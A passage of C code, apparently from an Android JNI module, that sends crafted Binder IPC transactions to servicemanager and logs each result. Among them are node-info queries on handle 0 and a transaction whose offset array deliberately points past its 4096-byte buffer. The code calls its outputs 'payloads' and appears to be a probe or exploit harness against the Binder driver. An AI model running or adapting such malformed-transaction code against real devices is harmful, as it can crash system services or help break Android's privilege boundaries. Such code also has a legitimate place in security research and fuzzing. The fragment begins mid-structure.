            .sender_pid = 0,
            .sender_euid = 0,
            .data_size = 0,
            .offsets_size = 0,
            .data.ptr.buffer = 0,
            .data.ptr.offsets = 0
        }
    };
    struct binder_transaction_data reply3;
    bwr3.write_size = sizeof(tx3);
    bwr3.write_buffer = (binder_uintptr_t)&tx3;
    bwr3.read_size = sizeof(reply3);
    bwr3.read_buffer = (binder_uintptr_t)&reply3;
    ret = ioctl(fd, BINDER_WRITE_READ, &bwr3);
    snprintf(tmp, sizeof(tmp), "  [3] TX handle=0,oneway -> ret=%d, read_consumed=%llu\n", ret, (unsigned long long)bwr3.read_consumed);
    strcat(result, tmp);

    struct binder_node_debug_info debug_info;
    memset(&debug_info, 0, sizeof(debug_info));
    ret = ioctl(fd, BINDER_GET_NODE_DEBUG_INFO, &debug_info);
    snprintf(tmp, sizeof(tmp), "  [4] BINDER_GET_NODE_DEBUG_INFO -> ret=%d (%s)\n", ret, (ret == 0) ? "SUCCESS" : strerror(errno));
    strcat(result, tmp);

    struct binder_node_info_for_ref info;
    memset(&info, 0, sizeof(info));
    info.handle = 0;
    ret = ioctl(fd, BINDER_GET_NODE_INFO_FOR_REF, &info);
    if (ret == 0) {
        snprintf(tmp, sizeof(tmp), "  [5] NODE_INFO handle=0 -> strong=%u, weak=%u\n", info.strong_count, info.weak_count);
    } else {
        snprintf(tmp, sizeof(tmp), "  [5] NODE_INFO handle=0 -> ret=%d (%s)\n", ret, strerror(errno));
    }
    strcat(result, tmp);

    uint8_t *data6 = malloc(4096);
    if (data6) {
        memset(data6, 0x42, 4096);
        binder_size_t offsets6[10];
        for (int i = 0; i < 10; i++) offsets6[i] = 8192 + i * 8;
        struct {
            uint32_t cmd;
            struct binder_transaction_data tdata;
        } __attribute__((packed)) tx6;
        tx6.cmd = BC_TRANSACTION;
        tx6.tdata.target.handle = 0;
        tx6.tdata.code = 1;
        tx6.tdata.flags = 0;
        tx6.tdata.data_size = 4096;
        tx6.tdata.offsets_size = sizeof(offsets6);
        tx6.tdata.data.ptr.buffer = (binder_uintptr_t)data6;
        tx6.tdata.data.ptr.offsets = (binder_uintptr_t)offsets6;

        struct binder_write_read bwr6;
        memset(&bwr6, 0, sizeof(bwr6));
        bwr6.write_size = sizeof(tx6);
        bwr6.write_buffer = (binder_uintptr_t)&tx6;
        bwr6.read_size = 0;
        bwr6.read_buffer = 0;
        ret = ioctl(fd, BINDER_WRITE_READ, &bwr6);
        free(data6);
        snprintf(tmp, sizeof(tmp), "  [6] Invalid offsets (GET_SERVICE) -> ret=%d (%s)\n", ret, (ret == 0) ? "SUCCESS" : strerror(errno));
        strcat(result, tmp);
    }

    strcat(result, "[+] Payloads sent to servicemanager.\n");
    return (*env)->NewStringUTF(env, result);
}
